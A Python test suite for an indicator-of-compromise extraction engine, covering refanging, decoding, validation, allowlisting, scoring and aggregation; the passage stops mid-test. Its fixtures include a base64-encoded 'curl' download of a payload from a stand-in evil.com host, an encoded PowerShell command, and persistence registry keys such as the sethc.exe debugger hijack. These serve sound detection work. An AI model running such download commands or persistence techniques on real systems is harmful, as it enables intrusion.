"""Core IOC engine tests (spec 05 sections 2-8).

Pure-function coverage of refanging, decoding, the candidate patterns and
validators, canonicalization, allowlisting, confidence scoring, aggregation and
the end-to-end extractor. The HTTP surface is exercised in ``test_api_iocs``:
that file and ``test_ioc_export`` together with this one carry the Phase 5
acceptance (spec 09), which requires every feature area to have labelled tests.
"""

from __future__ import annotations

import base64
import re
from ipaddress import ip_network
from pathlib import Path
from typing import Any

import pytest

from app.ioc import patterns
from app.ioc.aggregate import DEFAULT_OCCURRENCE_CAP, Occurrence, aggregate
from app.ioc.allowlist import EMPTY, Allowlist, entries_to_allowlist
from app.ioc.canonical import (
    canonical_value,
    extract_host,
    normalize_cve,
    normalize_domain,
    normalize_email,
    normalize_hash,
    normalize_url,
)
from app.ioc.decode import DEFAULT_DEPTH, MAX_DECODED_BYTES, Decoded, decode_all
from app.ioc.extract import extract_fields, extract_text
from app.ioc.refang import defang, refang
from app.ioc.score import (
    BASE_DECODED,
    BASE_MENTION,
    BASE_STRUCTURED,
    clamp,
    confidence,
)
from app.ioc.types import BASE_FREETEXT, IocCandidate, IocHit, IocType, Role
from app.ioc.validate import (
    SUSPICIOUS_DIRS,
    DomainMatch,
    PathMatch,
    classify_ip,
    is_ip_like,
    load_tlds,
    set_tlds,
    tlds,
    validate_cve,
    validate_domain,
    validate_email,
    validate_hash,
    validate_ipv4,
    validate_ipv6,
    validate_path,
    validate_registry,
    validate_url,
)


def b64(text: str) -> str:
    """Base64 (UTF-8) of ``text``, for decode fixtures."""
    return base64.b64encode(text.encode()).decode()


def b64u16(text: str) -> str:
    """Base64 of ``text`` as UTF-16LE, the PowerShell encoding."""
    return base64.b64encode(text.encode("utf-16-le")).decode()


MD5_HEX = "abcdef0123456789abcdef0123456789"
SHA1_HEX = "0123456789abcdef0123456789abcdef01234567"
SHA256_HEX = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"


def candidate(
    ioc_type: IocType,
    value: str,
    *,
    base: int = BASE_FREETEXT,
    **kwargs: Any,
) -> IocCandidate:
    """An ``IocCandidate`` whose norm follows the canonical rules."""
    return IocCandidate(
        type=ioc_type,
        value=value,
        value_norm=canonical_value(ioc_type, value),
        base=base,
        **kwargs,
    )


def hit(
    ioc_type: IocType,
    value: str,
    *,
    field: str = "message",
    role: Role = Role.MENTIONED,
    base: int = BASE_FREETEXT,
    **kwargs: object,
) -> IocHit:
    """A one-occurrence hit over a hand-built candidate."""
    return IocHit(
        candidate=candidate(ioc_type, value, base=base, **kwargs),
        field=field,
        role=role,
    )


def hits_by_type(items: list[IocHit]) -> dict[IocType, list[IocHit]]:
    """Group hits by type for readable assertions."""
    grouped: dict[IocType, list[IocHit]] = {}
    for item in items:
        grouped.setdefault(item.candidate.type, []).append(item)
    return grouped


# ---------------------------------------------------------------------------
# Refanging (spec 05 section 2.1)
# ---------------------------------------------------------------------------


class TestRefang:
    @pytest.mark.parametrize(
        ("source", "expected"),
        [
            ("hxxp://evil.com", "http://evil.com"),
            ("hxxps://evil.com", "https://evil.com"),
            ("fxp://evil.com", "ftp://evil.com"),
            ("hxxp[://]evil.com", "http://evil.com"),
            ("hxxp[:]//evil.com", "http://evil.com"),
            ("user[@]evil.com", "user@evil.com"),
            ("user[at]evil.com", "user@evil.com"),
            ("user(at)evil.com", "user@evil.com"),
            ("evil[dot]com", "evil.com"),
            ("evil(dot)com", "evil.com"),
            ("evil[.]com", "evil.com"),
            ("evil(.)com", "evil.com"),
            ("evil{.}com", "evil.com"),
            (r"evil\.com", "evil.com"),
        ],
        ids=lambda v: v if isinstance(v, str) else repr(v),
    )
    def test_marker_replacements(self, source: str, expected: str) -> None:
        assert refang(source) == expected

    def test_dot_word_between_label_tokens(self) -> None:
        assert refang("update.exe at evil dot com") == "update.exe at evil.com"

    def test_dot_word_survives_in_prose(self) -> None:
        assert refang("dot product is fine") == "dot product is fine"

    def test_hxxps_is_not_partially_replaced(self) -> None:
        assert refang("hxxps://evil.com") == "https://evil.com"

    def test_uppercase_forms_are_matched(self) -> None:
        assert refang("HXXP://evil.com") == "http://evil.com"

    def test_non_indicator_text_is_preserved(self) -> None:
        source = "download from hxxps://evil[.]com/?q=a now"
        assert refang(source) == "download from https://evil.com/?q=a now"

    def test_empty_string_passes_through(self) -> None:
        assert refang("") == ""

    def test_refang_is_idempotent_on_live_values(self) -> None:
        source = "http://evil.com/a"
        assert refang(source) == source

    def test_defang_renders_live_values_safe(self) -> None:
        assert defang("http://evil.com/a@b") == "hxxp://evil[.]com/a[@]b"

    def test_defang_uppercase_scheme(self) -> None:
        assert defang("HTTP://x") == "hxxp://x"

    def test_refang_to_defang_round_trip(self) -> None:
        live = "hxxp://evil.com/a"
        assert defang(refang(live)) == "hxxp://evil[.]com/a"


# ---------------------------------------------------------------------------
# Decoding passes (spec 05 section 2.2)
# ---------------------------------------------------------------------------


class TestDecode:
    def test_constants(self) -> None:
        assert DEFAULT_DEPTH == 2
        assert MAX_DECODED_BYTES == 256 * 1024

    def test_empty_text_has_no_children(self) -> None:
        assert decode_all("") == []

    def test_zero_depth_has_no_children(self) -> None:
        assert decode_all("anything at all", depth=0) == []

    def test_powershell_encoded_command(self) -> None:
        payload = b64u16("whoami")
        children = decode_all(f"powershell -EncodedCommand {payload}")
        assert children == [Decoded("whoami", "powershell_enc", 1)]

    def test_short_encoded_flag(self) -> None:
        payload = b64u16("whoami")
        children = decode_all(f"-e {payload}")
        assert children == [Decoded("whoami", "powershell_enc", 1)]

    def test_from_base64string_requires_getstring(self) -> None:
        token = b64("whoami")
        assert decode_all(f"[Convert]::FromBase64String('{token}')") == []
        text = f"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{token}'))"
        assert decode_all(text) == [Decoded("whoami", "powershell_enc", 1)]

    def test_standalone_base64_token(self) -> None:
        token = b64("curl http://evil.com/payload.exe")
        children = decode_all(f"download {token}")
        assert children == [Decoded("curl http://evil.com/payload.exe", "base64", 1)]

    def test_standalone_token_too_short_is_not_decoded(self) -> None:
        assert decode_all(f"token {b64('whoami')}") == []

    def test_nested_powershell_depth(self) -> None:
        inner = f"-e {b64u16('whoami')}"
        outer = f"-EncodedCommand {b64u16(inner)}"
        children = decode_all(outer, depth=2)
        assert [child.text for child in children] == [inner, "whoami"]
        assert [child.provenance for child in children] == ["powershell_enc", "powershell_enc"]
        assert [child.depth for child in children] == [1, 2]

    def test_depth_caps_recursion(self) -> None:
        inner = f"-e {b64u16('whoami')}"
        outer = f"-EncodedCommand {b64u16(inner)}"
        assert [child.text for child in decode_all(outer, depth=1)] == [inner]

    def test_percent_decoded_url_token(self) -> None:
        children = decode_all("go to https://evil.com/%61")
        assert children == [Decoded("https://evil.com/a", "url", 1)]

    def test_double_percent_encoding_collapses(self) -> None:
        children = decode_all("go to https://evil.com/%2561")
        assert [child.text for child in children] == ["https://evil.com/a"]

    def test_percent_without_a_url_is_not_decoded(self) -> None:
        assert decode_all("%61%62%63") == []

    def test_duplicate_children_are_deduplicated(self) -> None:
        token = b64("curl http://evil.com/payload.exe")
        assert len(decode_all(f"{token} {token}")) == 1

    def test_binary_children_are_rejected(self) -> None:
        token = base64.b64encode(b"\xff" * 40).decode()
        assert decode_all(token) == []

    def test_oversized_children_are_rejected(self) -> None:
        assert decode_all(b64("a" * 300_000)) == []


# ---------------------------------------------------------------------------
# Candidate patterns (spec 05 section 3)
# ---------------------------------------------------------------------------


class TestPatterns:
    @pytest.mark.parametrize(
        ("pattern", "matching", "not_matching"),
        [
            (
                patterns.IPV4,
                ["1.2.3.4", "255.255.255.255"],
                ["999.1.2.3", "10.1.2.3.4"],
            ),
            (patterns.IPV6, ["2001:db8::1", "fe80::a"], ["gg::1"]),
            (
                patterns.URL,
                ["http://evil.com/a", "ftp://10.0.0.1/x"],
                ["www.evil.com", "evil.com/a"],
            ),
            (patterns.EMAIL, ["a.b@evil.com"], ["nobody"]),
            (patterns.DOMAIN, ["evil.com", "a.b.sh"], ["10.1.2.3"]),
            (patterns.MD5, ["abcdef0123456789abcdef0123456789"], ["a" * 31]),
            (patterns.SHA1, ["abcd" * 10], ["a" * 31]),
            (patterns.SHA256, ["0f1e" * 16], ["a" * 63]),
            (patterns.CVE, ["CVE-2021-34527"], ["CVE-2021-1", "CVE-202111-34527"]),
            (patterns.WINPATH, [r"C:\Users\Public\evil.exe"], ["/tmp/x"]),
            (patterns.UNC_PATH, [r"\\server\share\payload.exe"], [r"C:\x.exe"]),
            (patterns.NIXPATH, ["/tmp/evil.sh", "/var/www/shell.php"], [r"C:\x.exe"]),
            (patterns.REGKEY, [r"HKLM\Software\Microsoft\Run"], ["run"]),
        ],
    )
    def test_match_vs_not_match(
        self, pattern: re.Pattern[str], matching: list[str], not_matching: list[str]
    ) -> None:
        for text in matching:
            assert pattern.search(text), f"{pattern!s} should match {text!r}"
        for text in not_matching:
            assert not pattern.search(text), f"{pattern!s} should not match {text!r}"

    def test_mac_is_clock_shaped(self) -> None:
        assert patterns.MAC.fullmatch("00:1a:2b:3c:4d:5e")

    def test_clock_is_time_shaped(self) -> None:
        assert patterns.CLOCK.fullmatch("12:34:56")

    def test_mac_and_clock_regexes_do_not_overlap(self) -> None:
        assert not patterns.MAC.fullmatch("12:34:56")
        assert not patterns.CLOCK.fullmatch("00:1a:2b:3c:4d:5e")

    def test_ambiguous_tlds_are_known(self) -> None:
        assert "sh" in patterns.AMBIGUOUS_TLDS
        assert "io" in patterns.AMBIGUOUS_TLDS

    def test_filename_extensions_are_known(self) -> None:
        assert "exe" in patterns.FILENAME_EXTENSIONS

    def test_id_context_regex(self) -> None:
        assert patterns.ID_CONTEXT.search("sid = ")
        assert patterns.ID_CONTEXT.search("uuid: ")
        assert not patterns.ID_CONTEXT.search("certid = 1")

    def test_leading_zero_regex(self) -> None:
        assert patterns.LEADING_ZERO.search("192.168.001.1")
        assert not patterns.LEADING_ZERO.search("10.1.2.3")


# ---------------------------------------------------------------------------
# Address validation (spec 05 sections 3 and 5)
# ---------------------------------------------------------------------------


class TestValidateIpv4:
    @pytest.mark.parametrize(
        ("token", "expected"),
        [
            ("1.2.3.4", "1.2.3.4"),
            ("203.0.113.9", "203.0.113.9"),
            ("0.0.0.0", "0.0.0.0"),
        ],
    )
    def test_valid_octets(self, token: str, expected: str) -> None:
        assert validate_ipv4(token) == expected

    @pytest.mark.parametrize("token", ["010.2.3.4", "1.2.3.999", "1.2.3", "1.2.3.a", "a.b.c.d"])
    def test_invalid_values(self, token: str) -> None:
        assert validate_ipv4(token) is None

    def test_leading_zero_octet_rejected(self) -> None:
        assert validate_ipv4("192.168.001.1") is None

    def test_version_prefix_rejected(self) -> None:
        assert validate_ipv4("1.2.3.4", prefix="ver ") is None
        assert validate_ipv4("1.2.3.4", prefix="ipv") is None

    def test_version_suffix_rejected(self) -> None:
        assert validate_ipv4("1.2.3.4", suffix="-b") is None
        assert validate_ipv4("1.2.3.4", suffix="-rc1") is None

    def test_non_letter_suffix_allowed(self) -> None:
        assert validate_ipv4("1.2.3.4", suffix="-1") == "1.2.3.4"


class TestValidateIpv6:
    @pytest.mark.parametrize(
        ("token", "expected"),
        [
            ("2001:db8::1", "2001:db8::1"),
            ("fe80::a", "fe80::a"),
            ("::1", "::1"),
        ],
    )
    def test_valid_addresses(self, token: str, expected: str) -> None:
        assert validate_ipv6(token) == expected

    @pytest.mark.parametrize("token", ["00:1a:2b:3c:4d:5e", "12:34:56", "gg::1", "1.2.3.4"])
    def test_shapes_that_are_not_ipv6(self, token: str) -> None:
        assert validate_ipv6(token) is None

    def test_ipv4_mapped_rejected(self) -> None:
        assert validate_ipv6("::ffff:1.2.3.4") is None

    def test_is_ip_like(self) -> None:
        assert is_ip_like("10.1.2.3")
        assert is_ip_like("2001:db8::1")
        assert not is_ip_like("1.2.3.999")
        assert not is_ip_like("evil.com")


class TestClassifyIp:
    @pytest.mark.parametrize("value", ["10.0.0.1", "172.16.0.1", "192.168.1.1"])
    def test_private_ranges(self, value: str) -> None:
        assert classify_ip(value)

    @pytest.mark.parametrize("value", ["8.8.8.8", "1.1.1.1", "2001:4860:4860::8888"])
    def test_public_addresses(self, value: str) -> None:
        assert not classify_ip(value)

    @pytest.mark.parametrize("value", ["192.0.2.1", "198.51.100.5", "203.0.113.9"])
    def test_documentation_ranges_are_public(self, value: str) -> None:
        assert not classify_ip(value)

    @pytest.mark.parametrize(
        "value",
        [
            "127.0.0.1",
            "169.254.1.1",
            "100.64.0.1",
            "240.0.0.1",
            "255.255.255.255",
            "0.0.0.0",
        ],
    )
    def test_reserved_and_loopback(self, value: str) -> None:
        assert classify_ip(value)

    @pytest.mark.parametrize("value", ["fc00::1", "fe80::", "ff02::1", "::1"])
    def test_ipv6_private_reserved(self, value: str) -> None:
        assert classify_ip(value)

    def test_non_address_is_not_private(self) -> None:
        assert not classify_ip("evil.com")
        assert not classify_ip("")


# ---------------------------------------------------------------------------
# Domain and URL validation (spec 05 section 3)
# ---------------------------------------------------------------------------


class TestValidateDomain:
    def test_simple_domain(self) -> None:
        assert validate_domain("evil.com") == DomainMatch("evil.com", ambiguous=False)

    def test_case_and_trailing_dot(self) -> None:
        assert validate_domain("Evil.COM.") == DomainMatch("evil.com", ambiguous=False)

    def test_punycode_normalization(self) -> None:
        assert validate_domain("Bücher.de") == DomainMatch("xn--bcher-kva.de", ambiguous=False)

    @pytest.mark.parametrize(
        "token",
        [
            "evil",
            "x" * 300 + ".com",
            ("a" * 64) + ".com",
            "-evil.com",
            "evil-.com",
            "10.1.2.3",
            "evil.notatld",
        ],
    )
    def test_invalid_domains(self, token: str) -> None:
        assert validate_domain(token) is None

    def test_punycode_tld_accepted_without_tld_list(self) -> None:
        assert validate_domain("site.xn--p1ai") is not None

    @pytest.mark.parametrize("token", ["release.rs", "a.io"])
    def test_ambiguous_tld_needs_more_labels_in_freetext(self, token: str) -> None:
        assert validate_domain(token) is None

    def test_ambiguous_tld_accepted_from_structured_field(self) -> None:
        assert validate_domain("release.rs", structured=True) == DomainMatch(
            "release.rs", ambiguous=True
        )

    def test_ambiguous_tld_accepted_with_three_labels(self) -> None:
        assert validate_domain("dash.release.rs") == DomainMatch("dash.release.rs", ambiguous=True)

    @pytest.mark.parametrize("token", ["installer.exe", "update.vbs", "notes.docm"])
    def test_extension_lookalikes_are_rejected(self, token: str) -> None:
        assert validate_domain(token) is None
        assert validate_domain(token, structured=True) is None

    @pytest.mark.parametrize("token", ["update.sh", "virus.sh"])
    def test_extension_lookalikes_that_are_real_tlds_obey_the_ambiguous_rule(
        self, token: str
    ) -> None:
        assert validate_domain(token) is None
        assert validate_domain(token, structured=True) == DomainMatch(token, ambiguous=True)


class TestValidateUrl:
    def test_basic_split(self) -> None:
        assert validate_url("http://evil.com/a") == ("http://evil.com/a", "evil.com")

    def test_trailing_sentence_punctuation_stripped(self) -> None:
        assert validate_url("https://evil.com/a.") == ("https://evil.com/a", "evil.com")

    def test_balanced_brackets_kept(self) -> None:
        assert validate_url("http://evil.com/(a)") == ("http://evil.com/(a)", "evil.com")

    def test_query_and_fragment_kept(self) -> None:
        assert validate_url("http://evil.com/a?x=1#f") == (
            "http://evil.com/a?x=1#f",
            "evil.com",
        )

    @pytest.mark.parametrize("token", ["evil.com/a", "http://10.0.0.1/x", "http://notatld/x"])
    def test_invalid_urls(self, token: str) -> None:
        assert validate_url(token) is None


# ---------------------------------------------------------------------------
# Email, hash and CVE validation (spec 05 section 3)
# ---------------------------------------------------------------------------


class TestValidateEmail:
    @pytest.mark.parametrize(
        ("source", "expected"),
        [
            ("a.b@evil.com", "a.b@evil.com"),
            ("A@Evil.COM", "a@evil.com"),
            ("a@release.rs", "a@release.rs"),
        ],
    )
    def test_valid_emails(self, source: str, expected: str) -> None:
        assert validate_email(source) == expected

    @pytest.mark.parametrize(
        "source",
        ["nobody@evil.notatld", "@evil.com", "a@" + "b" * 64 + "@x.com"],
    )
    def test_invalid_emails(self, source: str) -> None:
        assert validate_email(source) is None


class TestValidateHash:
    def test_lowercases(self) -> None:
        assert validate_hash("ABC" + "0" * 29) == ("abc" + "0" * 29)

    def test_distinct_characters_required(self) -> None:
        assert validate_hash("a" * 32) is None
        assert validate_hash("ab" * 16) is None

    @pytest.mark.parametrize("prefix", ["sid = ", "guid: ", "uuid = ", "certid = "])
    def test_id_context_prefixes_blocked(self, prefix: str) -> None:
        assert validate_hash(MD5_HEX, prefix=prefix) is None

    def test_non_id_prefix_allowed(self) -> None:
        assert validate_hash(MD5_HEX, prefix="serial = ") == MD5_HEX


class TestValidateCve:
    def test_uppercases(self) -> None:
        assert validate_cve("cve-2021-34527") == "CVE-2021-34527"

    def test_already_uppercase_passes_through(self) -> None:
        assert validate_cve("CVE-2021-34527") == "CVE-2021-34527"


# ---------------------------------------------------------------------------
# Tier-2 path and registry validation (spec 05 section 3)
# ---------------------------------------------------------------------------


class TestValidatePath:
    def test_windows_path_in_suspicious_dir(self) -> None:
        assert validate_path(r"C:\Users\Public\evil.exe") == PathMatch(
            path=r"C:\Users\Public\evil.exe", filename="evil.exe"
        )

    def test_arguments_cut_at_executable_extension(self) -> None:
        assert validate_path(r"C:\Temp\x.exe -enc blah") == PathMatch(
            path=r"C:\Temp\x.exe", filename="x.exe"
        )

    def test_executable_extension_alone_is_enough(self) -> None:
        assert validate_path(r"C:\Windows\System32\kernel32.dll") == PathMatch(
            path=r"C:\Windows\System32\kernel32.dll", filename="kernel32.dll"
        )

    def test_bare_drive_letter_path(self) -> None:
        assert validate_path(r"C:\evil.exe") == PathMatch(path=r"C:\evil.exe", filename="evil.exe")

    def test_boring_windows_path_is_dropped(self) -> None:
        assert validate_path(r"C:\Users\joe\notes.txt") is None

    def test_tmp_nix_path(self) -> None:
        assert validate_path("/tmp/evil.sh") == PathMatch(path="/tmp/evil.sh", filename="evil.sh")

    def test_var_www_nix_path(self) -> None:
        assert validate_path("/var/www/shell.php") == PathMatch(
            path="/var/www/shell.php", filename="shell.php"
        )

    def test_boring_nix_path_is_dropped(self) -> None:
        assert validate_path("/home/user/notes.txt") is None

    def test_unc_path(self) -> None:
        assert validate_path(r"\\evil\incoming\payload.exe") == PathMatch(
            path=r"\\evil\incoming\payload.exe", filename="payload.exe"
        )

    def test_suspicious_dirs_constants(self) -> None:
        assert "\\temp\\" in SUSPICIOUS_DIRS
        assert "/tmp/" in SUSPICIOUS_DIRS


class TestValidateRegistry:
    def test_run_key(self) -> None:
        key = r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
        assert validate_registry(key) == key

    def test_runonce_key(self) -> None:
        key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        assert validate_registry(key) == key

    def test_ifeo_key(self) -> None:
        key = (
            r"HKLM\Software\Microsoft\Windows NT\CurrentVersion"
            r"\Image File Execution Options\sethc.exe"
        )
        assert validate_registry(key) == key

    @pytest.mark.parametrize("key", [r"HKCU\Control Panel\Desktop", "Control Panel"])
    def test_boring_keys_are_dropped(self, key: str) -> None:
        assert validate_registry(key) is None


# ---------------------------------------------------------------------------
# Canonicalization (spec 05 section 7)
# ---------------------------------------------------------------------------


class TestCanonical:
    def test_domain_lowercase_and_trailing_dot(self) -> None:
        assert normalize_domain("Evil.COM.") == "evil.com"

    def test_domain_punycode(self) -> None:
        assert normalize_domain("Bücher.de") == "xn--bcher-kva.de"

    def test_extract_host_from_url(self) -> None:
        assert extract_host("http://Evil.COM:8080/a") == "evil.com"

    def test_url_default_port_dropped(self) -> None:
        assert normalize_url("http://evil.com:80/a") == "http://evil.com/a"

    def test_url_https_default_port_dropped(self) -> None:
        assert normalize_url("https://evil.com:443/a") == "https://evil.com/a"

    def test_url_non_default_port_kept(self) -> None:
        assert normalize_url("http://evil.com:8080/a") == "http://evil.com:8080/a"

    def test_url_fragment_dropped(self) -> None:
        assert normalize_url("http://evil.com/a#frag") == "http://evil.com/a"

    def test_url_scheme_host_lowercased_path_kept(self) -> None:
        assert normalize_url("HTTPS://Evil.COM/Search?Q=1") == "https://evil.com/Search?Q=1"

    def test_email_lowercased(self) -> None:
        assert normalize_email("A@Evil.COM") == "a@evil.com"

    def test_hash_lowercased(self) -> None:
        assert normalize_hash("ABC" + "0" * 29) == "abc" + "0" * 29

    def test_cve_uppercased(self) -> None:
        assert normalize_cve("cve-2021-34527") == "CVE-2021-34527"

    @pytest.mark.parametrize(
        ("ioc_type", "value", "expected"),
        [
            (IocType.DOMAIN, "Evil.COM.", "evil.com"),
            (IocType.URL, "HTTP://Evil.COM:80/A", "http://evil.com/A"),
            (IocType.EMAIL, "A@Evil.COM", "a@evil.com"),
            (IocType.MD5, "ABC" + "0" * 29, "abc" + "0" * 29),
            (IocType.CVE, "cve-2021-34527", "CVE-2021-34527"),
            (IocType.IPV4, "203.0.113.9", "203.0.113.9"),
            (IocType.IPV6, "2001:DB8::1", "2001:db8::1"),
            (IocType.FILENAME, "Payload.EXE", "payload.exe"),
            (IocType.FILEPATH, r"C:\Users\Public\X.EXE", r"c:\users\public\x.exe"),
            (IocType.REGISTRY, r"HKLM\Software\Run", r"hklm\software\run"),
        ],
    )
    def test_canonical_value(self, ioc_type: IocType, value: str, expected: str) -> None:
        assert canonical_value(ioc_type, value) == expected


# ---------------------------------------------------------------------------
# Allowlisting (spec 05 section 5)
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_domain_exact_with_case(self) -> None:
        rules = Allowlist(domain=frozenset({"evil.com"}))
        assert rules.matches(IocType.DOMAIN, "Evil.COM", "evil.com")

    def test_domain_suffix_matches_subdomains(self) -> None:
        rules = Allowlist(domain_suffix=frozenset({"evil.com"}))
        assert rules.matches(IocType.DOMAIN, "sub.evil.com", "sub.evil.com")
        assert rules.matches(IocType.DOMAIN, "sub.other.evil.com", "sub.other.evil.com")

    def test_domain_suffix_does_not_match_prefix_cousins(self) -> None:
        rules = Allowlist(domain_suffix=frozenset({"evil.com"}))
        assert not rules.matches(IocType.DOMAIN, "badevil.com", "badevil.com")
        assert not rules.matches(IocType.DOMAIN, "evil.com.org", "evil.com.org")

    def test_domain_suffix_matches_the_bare_host(self) -> None:
        rules = Allowlist(domain_suffix=frozenset({"evil.com"}))
        assert rules.matches(IocType.DOMAIN, "evil.com", "evil.com")

    def test_suffix_normalized_at_build_time(self) -> None:
        rules = entries_to_allowlist([("domain_suffix", "Evil.COM.")])
        assert rules.matches(IocType.DOMAIN, "sub.evil.com", "sub.evil.com")

    def test_url_host_is_checked(self) -> None:
        rules = Allowlist(domain_suffix=frozenset({"evil.com"}))
        assert rules.matches(IocType.URL, "http://evil.com/a", "http://evil.com/a")

    def test_ip_exact(self) -> None:
        rules = Allowlist(ip=frozenset({"10.0.0.1"}))
        assert rules.matches(IocType.IPV4, "10.0.0.1", "10.0.0.1")
        assert not rules.matches(IocType.IPV4, "10.0.0.2", "10.0.0.2")

    def test_ipv6_exact(self) -> None:
        rules = Allowlist(ip=frozenset({"2001:db8::1"}))
        assert rules.matches(IocType.IPV6, "2001:db8::1", "2001:db8::1")

    def test_cidr(self) -> None:
        rules = Allowlist(cidr=(ip_network("10.0.0.0/8"),))
        assert rules.matches(IocType.IPV4, "10.1.2.3", "10.1.2.3")
        assert not rules.matches(IocType.IPV4, "8.8.8.8", "8.8.8.8")

    def test_cidr_ipv6(self) -> None:
        rules = Allowlist(cidr=(ip_network("2001:db8::/32"),))
        assert rules.matches(IocType.IPV6, "2001:db8::1", "2001:db8::1")

    def test_hash_lowercased(self) -> None:
        rules = Allowlist(hash=frozenset({MD5_HEX}))
        assert rules.matches(IocType.MD5, MD5_HEX.upper(), MD5_HEX.upper())

    def test_regex_matches_either_spelling(self) -> None:
        rules = Allowlist(regex=(re.compile(r"evil\.com$"),))
        assert rules.matches(IocType.DOMAIN, "a.evil.com", "a.evil.com")

    def test_kinds_do_not_cross_apply(self) -> None:
        ip_rules = Allowlist(ip=frozenset({"10.0.0.1"}))
        assert not ip_rules.matches(IocType.DOMAIN, "10.0.0.1", "10.0.0.1")
        hash_rules = Allowlist(hash=frozenset({"evil.com"}))
        assert not hash_rules.matches(IocType.DOMAIN, "evil.com", "evil.com")

    def test_combined_merges_all_kinds(self) -> None:
        left = Allowlist(domain=frozenset({"a.com"}), ip=frozenset({"10.0.0.1"}))
        right = Allowlist(domain_suffix=frozenset({"b.com"}), hash=frozenset({MD5_HEX}))
        merged = left.combined(right)
        assert merged.matches(IocType.DOMAIN, "a.com", "a.com")
        assert merged.matches(IocType.DOMAIN, "x.b.com", "x.b.com")
        assert merged.matches(IocType.IPV4, "10.0.0.1", "10.0.0.1")
        assert merged.matches(IocType.MD5, MD5_HEX, MD5_HEX)

    def test_entries_to_allowlist_all_kinds(self) -> None:
        rules = entries_to_allowlist(
            [
                ("domain", "a.com"),
                ("domain_suffix", "b.com"),
                ("ip", "10.0.0.1"),
                ("cidr", "192.168.0.0/16"),
                ("hash", MD5_HEX),
            ]
        )
        assert rules.matches(IocType.DOMAIN, "a.com", "a.com")
        assert rules.matches(IocType.DOMAIN, "x.b.com", "x.b.com")
        assert rules.matches(IocType.IPV4, "10.0.0.1", "10.0.0.1")
        assert rules.matches(IocType.IPV4, "192.168.5.5", "192.168.5.5")
        assert rules.matches(IocType.MD5, MD5_HEX, MD5_HEX)

    def test_empty_matches_nothing(self) -> None:
        assert not EMPTY.matches(IocType.DOMAIN, "evil.com", "evil.com")


# ---------------------------------------------------------------------------
# Confidence scoring (spec 05 section 6)
# ---------------------------------------------------------------------------


class TestScore:
    def test_plain_base(self) -> None:
        assert confidence(BASE_MENTION) == 50
        assert confidence(BASE_STRUCTURED) == 80
        assert confidence(BASE_DECODED) == 60

    def test_occurrence_bonus_at_threshold(self) -> None:
        assert confidence(BASE_MENTION, occurrences=4) == 50
        assert confidence(BASE_MENTION, occurrences=5) == 60

    def test_distinct_hosts_bonus_at_threshold(self) -> None:
        assert confidence(BASE_MENTION, distinct_hosts=2) == 50
        assert confidence(BASE_MENTION, distinct_hosts=3) == 55

    def test_alert_bonus(self) -> None:
        assert confidence(BASE_MENTION, in_alert=True) == 65

    def test_private_penalty(self) -> None:
        assert confidence(BASE_STRUCTURED, is_private=True) == 60

    def test_allowlist_penalty(self) -> None:
        assert confidence(BASE_MENTION, is_allowlisted=True) == 10

    def test_ambiguous_tld_penalty(self) -> None:
        assert confidence(BASE_STRUCTURED, ambiguous=True) == 50

    def test_penalties_stack(self) -> None:
        assert confidence(BASE_MENTION, is_private=True, is_allowlisted=True, ambiguous=True) == 0

    def test_clamp_lower_bound(self) -> None:
        assert confidence(BASE_MENTION, is_private=True, is_allowlisted=True) == 0

    def test_clamp_upper_bound(self) -> None:
        score = confidence(
            BASE_STRUCTURED,
            in_alert=True,
            occurrences=5,
            distinct_hosts=3,
        )
        assert score == 100

    def test_clamp_function(self) -> None:
        assert clamp(-5) == 0
        assert clamp(120) == 100
        assert clamp(42) == 42


# ---------------------------------------------------------------------------
# Aggregation (spec 05 section 7)
# ---------------------------------------------------------------------------


class TestAggregate:
    def test_constants(self) -> None:
        assert DEFAULT_OCCURRENCE_CAP == 50

    def test_same_indicator_across_events_groups_once(self) -> None:
        records = [
            (1, None, [hit(IocType.IPV4, "10.1.2.3")]),
            (2, None, [hit(IocType.IPV4, "10.1.2.3")]),
        ]
        groups = aggregate(records)
        assert len(groups) == 1
        assert groups[0].occurrences == 2

    def test_distinct_types_stay_separate(self) -> None:
        records = [
            (1, None, [hit(IocType.IPV4, "10.1.2.3"), hit(IocType.DOMAIN, "evil.com")]),
            (2, None, [hit(IocType.DOMAIN, "evil.com")]),
        ]
        groups = aggregate(records)
        assert len(groups) == 2
        by_type = {group.ioc.type: group for group in groups}
        assert by_type[IocType.DOMAIN].occurrences == 2
        assert by_type[IocType.IPV4].occurrences == 1

    def test_first_and_last_seen(self) -> None:
        records = [
            (1, 100, [hit(IocType.IPV4, "10.1.2.3")]),
            (2, 300, [hit(IocType.IPV4, "10.1.2.3")]),
            (3, 200, [hit(IocType.IPV4, "10.1.2.3")]),
        ]
        groups = aggregate(records)
        assert groups[0].first_seen_ms == 100
        assert groups[0].last_seen_ms == 300

    def test_occurrence_counts_distinct_event_field_pairs(self) -> None:
        one_hit = hit(IocType.IPV4, "10.1.2.3", field="message")
        records = [(1, None, [one_hit, one_hit])]
        assert aggregate(records)[0].occurrences == 1

    def test_structured_spelling_wins_the_base(self) -> None:
        records = [
            (1, None, [hit(IocType.DOMAIN, "evil.com", base=BASE_FREETEXT)]),
            (2, None, [hit(IocType.DOMAIN, "evil.com", base=BASE_STRUCTURED)]),
        ]
        group = aggregate(records)[0]
        assert group.base == BASE_STRUCTURED
        assert group.ioc == candidate(IocType.DOMAIN, "evil.com", base=BASE_STRUCTURED)

    def test_occurrence_rows_record_role_and_provenance(self) -> None:
        the_hit = hit(
            IocType.DOMAIN,
            "evil.com",
            field="url",
            role=Role.URL_REQUEST,
            base=BASE_DECODED,
        )
        group = aggregate([(7, None, [the_hit])])[0]
        assert group.rows == [Occurrence(7, "url", Role.URL_REQUEST, None)]
        assert group.confidence_score() == BASE_DECODED

    def test_occurrence_cap_bounds_rows_not_count(self) -> None:
        records = [(i, i, [hit(IocType.IPV4, "10.1.2.3", field="message")]) for i in range(60)]
        group = aggregate(records, occurrence_cap=10)[0]
        assert len(group.rows) == 10
        assert group.occurrences == 60

    def test_default_cap_constant_matches_default_usage(self) -> None:
        records = [
            (i, i, [hit(IocType.IPV4, "10.1.2.3")]) for i in range(DEFAULT_OCCURRENCE_CAP + 5)
        ]
        group = aggregate(records)[0]
        assert len(group.rows) == DEFAULT_OCCURRENCE_CAP

    def test_order_is_first_seen(self) -> None:
        records = [
            (1, None, [hit(IocType.DOMAIN, "first.com")]),
            (2, None, [hit(IocType.DOMAIN, "second.com")]),
        ]
